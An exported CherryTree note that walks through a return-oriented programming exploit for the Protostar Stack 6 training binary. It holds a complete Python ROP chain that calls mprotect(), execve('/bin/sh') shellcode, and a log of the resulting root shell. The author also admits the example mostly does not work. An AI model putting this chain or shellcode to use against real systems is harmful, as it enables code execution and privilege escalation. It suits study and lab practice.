<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>ROP</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Exploit Development - Linux - x86 - ROP</h1></strong><br /><a href="https://en.wikipedia.org/wiki/Return-oriented_programming">https://en.wikipedia.org/wiki/Return-oriented_programming</a><br /><a href="https://www.youtube.com/watch?v=3SY2SI60C2s">https://www.youtube.com/watch?v=3SY2SI60C2s</a><br /><br />ROP stands for Return-Oriented Programming. <br />It&#39;s an attack technique that was developed to bypass a non-executable stack.<br /><br />ROP is where you overwrite the return addresses on the stack with “gadgets” (assembly instructions that are already present in the program/memory). After the first gadget has been run, a return instruction will be executed (0xC3 on x86), which will pop the address of the next gadget off the stack and jump to it. When you chain multiple gadgets together like this, you have code execution and are effectively writing assembly code.<br /><br />In short, you&#39;re using the assembly instructions already present in the compiled binary and overwriting the return address on the stack to execute a series of instructions of your own choosing. With this, you can exploit the whole system.<br /><br /><strong><h2>## Example from </h2></strong><em><strong><h2>Protostar Stack 6</h2></strong></em><h2> </h2><strong><h2>using mprotect()</h2></strong><br /><a href="https://exploit.education/protostar/stack-six/">https://exploit.education/protostar/stack-six/</a><br /><br /><strong>UPDATE 19/12/2019:</strong> THE EXAMPLE BELOW 90% DOESN&#39;T WORK. BUT THE METHODOLOGY IS STILL CORRECT. YOU HAVE TO HAVE A LOT OF SUITABLE ADDRESSES FOR THIS SORT OF LONG-WINDED ROP TO WORK.<br /><br /><strong>General overview of exploit structure</strong><br />1. A padding of N bytes (overwrite EIP)<br />2. ROP chain to mprotect() (a function which can mark part of the stack as executable)<br />   1) Set EAX to syscall number<br />   2) Set EBX to stack address<br />   3) Set ECX to length of stack to mark as executable<br />   4) Set EDX to protection ordinal - 7 for read/write/execute<br />4. Run mprotect() by calling syscall<br />5. Set a jump to esp (to jump to shellcode)<br />6. Shellcode/payload runs (we win!)<br /><br /><strong><h3>### Pre-requisite mprotect()/syscall knowledge</h3></strong><br />Stuff that you should know about mprotect() and 32-bit syscalls...<br /><br /><strong>How syscalls work on 32-bit linux</strong><br />You set eax to the syscall number of the function you want to run e.g. mprotect()&#39;s syscall number is 125<br />EAX should equal 125.<br />Therefore, we need to know mprotect()&#39;s syscall number.<br /><br />The rest of the registers (from ebx, ecx, edx etc. onwards) contain the function parameters.<br /><br /><strong>How to find mprotect()&#39;s syscall number</strong><br /><code>grep -rw __NR_mprotect /usr/include/</code><br /><div class="codebox"><div class="codebox">root@gotham:~/ctf/protostar#&nbsp;grep&nbsp;-rw&nbsp;__NR_mprotect&nbsp;/usr/include/<br />/usr/include/asm-generic/unistd.h:#define&nbsp;__NR_mprotect&nbsp;226<br />/usr/include/asm-generic/unistd.h:__SYSCALL(__NR_mprotect,&nbsp;sys_mprotect)<br />/usr/include/i386-linux-gnu/bits/syscall.h:#ifdef&nbsp;__NR_mprotect<br />/usr/include/i386-linux-gnu/bits/syscall.h:#&nbsp;define&nbsp;SYS_mprotect&nbsp;__NR_mprotect<br />/usr/include/i386-linux-gnu/asm/unistd_32.h:#define&nbsp;__NR_mprotect&nbsp;125&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;←&nbsp;WE&nbsp;WANT&nbsp;THIS&nbsp;ONE<br />/usr/include/i386-linux-gnu/asm/unistd_64.h:#define&nbsp;__NR_mprotect&nbsp;10<br />/usr/include/i386-linux-gnu/asm/unistd_x32.h:#define&nbsp;__NR_mprotect&nbsp;(__X32_SYSCALL_BIT&nbsp;+&nbsp;10)<br />/usr/include/libr/sflib/darwin-x86-32/sfsysnr.h:#define	__NR_mprotect	74<br />/usr/include/libr/sflib/linux-arm-32/sfsysnr.h:#define&nbsp;__NR_mprotect			10<br />/usr/include/libr/sflib/linux-x86-64/sfsysnr.h:#define&nbsp;__NR_mprotect			10<br />/usr/include/libr/sflib/darwin-arm-64/sfsysnr.h:#define	__NR_mprotect	74<br />/usr/include/libr/sflib/linux-arm-64/sfsysnr.h:#define&nbsp;__NR_mprotect			10<br />/usr/include/libr/sflib/linux-x86-32/sfsysnr.h:#define&nbsp;__NR_mprotect		125<br />/usr/include/libr/sflib/darwin-x86-64/sfsysnr.h:#define	__NR_mprotect	74</div></div><br /><br /><code>mprotect()</code> syscall number = 125<br /><br /><strong>mprotect() syntax</strong><br />You can	have a look at man page for the mprotect() syscall and its parameters - <code>man mprotect</code><br />Here&#39;s the mprotect() syntax -	<code>int mprotect(void *addr, size_t len, int prot);</code><br /><br />    <code>void *addr</code> - This paramter is the stack address you want to change the protections of<br />    <code>size_t len</code> - The length (amount) of memory you want to mark as executable starting from the address defined above<br />    <code>int prot</code> - These are the protections you want to set (in ordinal? i think?) | 7 = read/write/execute<br /><br /><strong>mprotect() summary</strong><br />This is the plan of action for the script<br /><br />1. Set EAX to 125<br />2. Set EBX to the stack address we&#39;re changing protections of<br />		The address in EBX has to be page aligned (stack addresses that are page aligned will end in a NULL byte - <code>00</code>)<br />3. Set ECX to len<br />		The length has to be modulo the page size (apparently? I&#39;ve had success without doing this, like in the example here)<br />4. Set EDX to prot (the protections you&#39;re setting)<br />		Set prot as 7 (read/write/execute)<br /><br /><strong>Challenges we&#39;ll face :/</strong><br />• THE MEMORY ADDRESSES OF INSTRUCTIONS THAT YOU USE MUSTN&#39;T HAVE ANY BAD CHARACTERS<br />    • NULL bytes - 0x00<br />    • Newlines \n - 0x0a<br />    • Carriage returns \t - 0x0d<br />    • etc.<br />		<br />	<strong>Challenge example with EAX and solution</strong><br />	We need to set EAX to 125<br />		125 as a 32-bit number is full of NULLs - <code>0x0000007d</code><br />		The solution is to set eax to <code>0xffffffff</code> (the highest possible 32-bit value)<br />				You then increment eax (by 1), and the value will reset to <code>0x00000000</code><br />				Then you increment eax * 125 - <code>payload += inc_eax_ret * 125</code><br />				Now you have 125 in EAX - <code>0x0000007d</code><br /><br /><strong><h3>### Code Walkthrough</h3></strong><br /><strong>1. Set EAX</strong><br />	1a) find a &quot;pop eax; ret&quot; instruction (to pop the value at top of the stack into eax)<br />		gdb-peda --&gt; <code>ropsearch &quot;pop eax; ret&quot; libc</code><br />	2a) find instruction to increment eax<br />		gdb-peda --&gt; <code>ropsearch &quot;inc eax; ret&quot; libc</code><br /><strong>2. Set EBX to stack address</strong><br />	2a) find a &quot;pop ebx; ret&quot; instruction<br />		gdb-peda --&gt; <code>ropsearch &quot;pop ebx; ret&quot; libc</code><br />	2b) the address has to be page aligned<br />		gdb-peda --&gt; <code>vmmap</code><br />		find [stack] entry<br />		page aligned stack addresses have a NULL byte at the end - e.g. 0xfffdc000<br />		to get around the NULL byte just add 1 to the address - 0xfffdc001 - then use a &quot;dec ebx; ret&quot; instruction<br />		gdb-peda --&gt; <code>ropsearch &quot;dec ebx; ret&quot; libc</code><br /><strong>3. Set ECX to len (modulo page size)</strong><br />	3a) find a &quot;pop ecx; ret&quot; instruction<br />		gdb-peda --&gt; <code>ropsearch &quot;pop ecx; ret&quot; libc</code><br />	3b) find instruction to increment ecx<br />		gdb-peda --&gt; <code>ropsearch &quot;inc ecx; ret&quot; libc</code><br />	3c) Set ECX to align with a page size (using your inc ecx instruction)<br />		e.g. 1 memory page - ecx = 4096<br />			 2 memory pages - ecx = 8192<br />			 etc.<br />			NOTE: I&#39;ve gotten away without doing this, as done in the script below :)<br /><strong>4. Set EDX to prot (prot should be 7 for read/write/execute)</strong><br />	3a) find a &quot;pop edx; ret&quot; instruction<br />		gdb-peda --&gt; <code>ropsearch &quot;pop edx; ret&quot; libc</code><br />	3b) find instruction to increment edx<br />		gdb-peda --&gt; <code>ropsearch &quot;inc edx; ret&quot; libc</code><br /><strong>5. Do syscall</strong><br />	5a) look at the syscall code in libc using gdb - x/i syscall<br />		keep pressing enter until you find the call instruction<br />		save it in python script<br />			<code>libc_syscall = struct.pack(&#39;&lt;I&#39;, &lt;address&gt;)</code><br />	5b) after the syscall there&#39;s 4 pops - pop ebx, pop esi, pop edi, pop ebp<br />		you need to put some junk data on the stack to be popped - AAAA, BBBB, CCCC, DDDD<br /><strong>6. Jump to esp (to jump to shellcode)</strong><br />	6a) find a &quot;jmp esp&quot; instruction<br />		gdb-peda --&gt; <code>jmpscall esp libc</code><br /><strong>7. Insert your shellcode :)</strong><br />	whilst you&#39;re testing, set your <code>shellcode = &quot;\xcc&quot;</code> - a sig trap<br />	you&#39;ll know you&#39;ve hit your shellcode if your program crashes with a sig trap<br />	<br /><br /><em><strong>TIPS FOR DEBUGGING/FIGURING OUT WHY IT&#39;S NOT WORKING</strong></em><br />You&#39;ll have to debug at some point. You&#39;re bound to make mistakes with this.<br /><br />1. Use pwntools and connect the binary to gdb so you can debug what&#39;s going on<br />	<code>from pwn import *</code><br />	<code>PROGNAME = &quot;./&lt;binary&quot;</code><br />	<code>gdb.debug(PROGNAME)</code><br /><br />2. Whilst you&#39;re testing, set your <code>shellcode = &quot;\xcc&quot;</code> - a sig trap<br />    You&#39;ll know you&#39;ve hit your shellcode if your program crashes with a sig trap<br /><br />3. To check that the registers are being filled out properly, comment out your payload register by register<br />    e.g. Comment out your payload so that EAX will get set, and then check that EAX is the correct value<br />          Then comment out up to EBX being set, and check that it&#39;s correct etc.<br />    Your program will crash, but you&#39;ll be able to check if the right value is in each register<br /><br /><strong><h3>### Code</h3></strong><br /><div class="codebox"><div class="codebox">#&nbsp;stack6rop.py&nbsp;-&nbsp;exploit&nbsp;for&nbsp;stack6&nbsp;using&nbsp;ROP<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;to&nbsp;mprotect()&nbsp;and&nbsp;make&nbsp;stack&nbsp;executable<br /><br />import&nbsp;struct<br /><br />#&nbsp;shellcode&nbsp;for&nbsp;execve(&quot;/bin/sh&quot;)&nbsp;-&nbsp;28&nbsp;bytes<br />#&nbsp;http://shell-storm.org/shellcode/files/shellcode-811.php<br />shellcode&nbsp;=&nbsp;(&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x31\xc0\x50\x68\x2f\x2f\x73&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x68\x68\x2f\x62\x69\x6e\x89&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xe3\x89\xc1\x89\xc2\xb0\x0b&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xcd\x80\x31\xc0\x40\xcd\x80&quot;<br />)<br /><br />#&nbsp;FUNCTION&nbsp;-&nbsp;int&nbsp;mprotect(void&nbsp;*addr,&nbsp;size_t&nbsp;len,&nbsp;int&nbsp;prot);<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;ebx&nbsp;=&nbsp;void&nbsp;*addr&nbsp;(stack&nbsp;address&nbsp;to&nbsp;make&nbsp;executable)<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;ecx&nbsp;=&nbsp;size_t&nbsp;len&nbsp;(how&nbsp;many&nbsp;pages&nbsp;to&nbsp;make&nbsp;executable&nbsp;from&nbsp;stack&nbsp;address)<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;edx&nbsp;=&nbsp;int&nbsp;prot&nbsp;(what&nbsp;protections&nbsp;to&nbsp;set)&nbsp;-&nbsp;set&nbsp;7&nbsp;for&nbsp;read/write/execute<br /><br />#&nbsp;gadgets<br />ffffffff&nbsp;=&nbsp;struct.pack(&#39;&lt;I&#39;,&nbsp;0xffffffff)<br /><br />pop_eax_ret&nbsp;=&nbsp;struct.pack(&#39;&lt;I&#39;,&nbsp;0xb7df7687)<br />inc_eax_ret&nbsp;=&nbsp;struct.pack(&#39;&lt;I&#39;,&nbsp;0xb7dd9dd0)<br /><br />pop_ebx_ret&nbsp;=&nbsp;struct.pack(&#39;&lt;I&#39;,&nbsp;0xb7deb8b5)<br />stack_addr_plus1&nbsp;=&nbsp;struct.pack(&#39;&lt;I&#39;,&nbsp;0xbffdf001)&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;can&#39;t&nbsp;be&nbsp;any&nbsp;NULL&nbsp;bytes<br />dec_ebx_ret&nbsp;=&nbsp;struct.pack(&#39;&lt;I&#39;,&nbsp;0xb7f641ca)<br /><br />pop_ecx_ret&nbsp;=&nbsp;struct.pack(&#39;&lt;I&#39;,&nbsp;0xb7f67fa4)<br />inc_ecx_ret&nbsp;=&nbsp;struct.pack(&#39;&lt;I&#39;,&nbsp;0xb7f5fd61)<br /><br />pop_edx_ret&nbsp;=&nbsp;struct.pack(&#39;&lt;I&#39;,&nbsp;0xb7dd2af2)<br />inc_edx_ret&nbsp;=&nbsp;struct.pack(&#39;&lt;I&#39;,&nbsp;0xb7dfe654)<br /><br />libc_syscall&nbsp;=&nbsp;struct.pack(&#39;&lt;I&#39;,&nbsp;0xb7ec6d20)<br /><br />jmp_esp&nbsp;=&nbsp;struct.pack(&#39;&lt;I&#39;,&nbsp;0xb7dd3bb5)<br /><br />#&nbsp;payload<br />payload&nbsp;&nbsp;=&nbsp;&quot;A&quot;*80<br /><br />#&nbsp;1.&nbsp;set&nbsp;eax&nbsp;to&nbsp;125&nbsp;(mprotect&nbsp;syscall&nbsp;number)<br />payload&nbsp;+=&nbsp;pop_eax_ret<br />payload&nbsp;+=&nbsp;ffffffff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;eax&nbsp;=&nbsp;0xffffffff<br />payload&nbsp;+=&nbsp;inc_eax_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;eax&nbsp;=&nbsp;0x00000000<br />payload&nbsp;+=&nbsp;inc_eax_ret&nbsp;*&nbsp;125&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;eax&nbsp;=&nbsp;0x0000007d&nbsp;(125&nbsp;decimal)<br /><br />#&nbsp;2.&nbsp;set&nbsp;ebx&nbsp;to&nbsp;stack&nbsp;address<br />payload&nbsp;+=&nbsp;pop_ebx_ret<br />payload&nbsp;+=&nbsp;stack_addr_plus1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;ebx&nbsp;=&nbsp;0xbffdf001<br />payload&nbsp;+=&nbsp;dec_ebx_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;ebx&nbsp;=&nbsp;0xbffdf000&nbsp;<br /><br />#&nbsp;3.&nbsp;set&nbsp;ecx&nbsp;to&nbsp;how&nbsp;much&nbsp;stack&nbsp;to&nbsp;make&nbsp;executable&nbsp;(must&nbsp;be&nbsp;a&nbsp;page&nbsp;size)<br />payload&nbsp;+=&nbsp;pop_ecx_ret<br />payload&nbsp;+=&nbsp;ffffffff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;ecx&nbsp;=&nbsp;0xffffffff<br />payload&nbsp;+=&nbsp;inc_ecx_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;ecx&nbsp;=&nbsp;0x00000000<br />payload&nbsp;+=&nbsp;inc_ecx_ret&nbsp;*&nbsp;600&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;ecx&nbsp;=&nbsp;0x00000258&nbsp;(600&nbsp;decimal)&nbsp;-&nbsp;WE&nbsp;CRASH&nbsp;HERE.&nbsp;doesn&#39;t&nbsp;crash&nbsp;if&nbsp;&lt;&nbsp;700&nbsp;however&nbsp;:thinking:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;2&nbsp;pages&nbsp;of&nbsp;memory&nbsp;will&nbsp;be&nbsp;marked&nbsp;executable<br /><br />#&nbsp;4.&nbsp;set&nbsp;edx&nbsp;to&nbsp;protection&nbsp;setting&nbsp;(7&nbsp;for&nbsp;read/write/execute)<br />payload&nbsp;+=&nbsp;pop_edx_ret<br />payload&nbsp;+=&nbsp;ffffffff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;edx&nbsp;=&nbsp;0xffffffff<br />payload&nbsp;+=&nbsp;inc_edx_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;edx&nbsp;=&nbsp;0x00000000<br />payload&nbsp;+=&nbsp;inc_edx_ret&nbsp;*&nbsp;7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;edx&nbsp;=&nbsp;0x00000007<br /><br />#&nbsp;registers&nbsp;for&nbsp;mprotect()&nbsp;are&nbsp;set&nbsp;up<br />#&nbsp;5.&nbsp;now&nbsp;call&nbsp;mprotect()&nbsp;using&nbsp;syscall<br />payload&nbsp;+=&nbsp;libc_syscall<br />payload&nbsp;+=&nbsp;&quot;A&quot;*4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;junk&nbsp;for&nbsp;syscall&nbsp;pop&nbsp;ebx<br />payload&nbsp;+=&nbsp;&quot;B&quot;*4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;junk&nbsp;for&nbsp;syscall&nbsp;pop&nbsp;esi<br />payload&nbsp;+=&nbsp;&quot;C&quot;*4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;junk&nbsp;for&nbsp;syscall&nbsp;pop&nbsp;edi<br />payload&nbsp;+=&nbsp;&quot;D&quot;*4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;junk&nbsp;for&nbsp;syscall&nbsp;pop&nbsp;ebp<br /><br />#&nbsp;6.&nbsp;jump&nbsp;esp&nbsp;(jump&nbsp;to&nbsp;stack&nbsp;of&nbsp;stack&nbsp;where&nbsp;shellcode&nbsp;will&nbsp;be)<br />payload&nbsp;+=&nbsp;jmp_esp<br /><br />#&nbsp;7.&nbsp;shellcode!<br />payload&nbsp;+=&nbsp;shellcode<br /><br />print&nbsp;payload</div></div><br /><br /><strong><h3>Win :)</h3></strong><br /><div class="codebox"><div class="codebox">root@gotham:~/ctf/protostar#&nbsp;(python&nbsp;stack6rop.py;&nbsp;cat)&nbsp;|&nbsp;binaries/stack6<br />input&nbsp;path&nbsp;please:&nbsp;got&nbsp;path&nbsp;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�v߷AAAAAAAAAAAA�v߷����НݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷНݷ��޷����A���������a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a���a����*ݷ����T�߷T�߷T�߷T�߷T�߷T�߷T�߷T�߷&nbsp;m�AAAABBBBCCCCDDDD�;ݷ1�Ph//shh/bin����°<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1�@̀<br />id<br />uid=0(root)&nbsp;gid=0(root)&nbsp;groups=0(root)<br />whoami<br />root<br />^C<br />root@gotham:~/ctf/protostar#&nbsp;</div></div><br /></div>
</body>
</html>
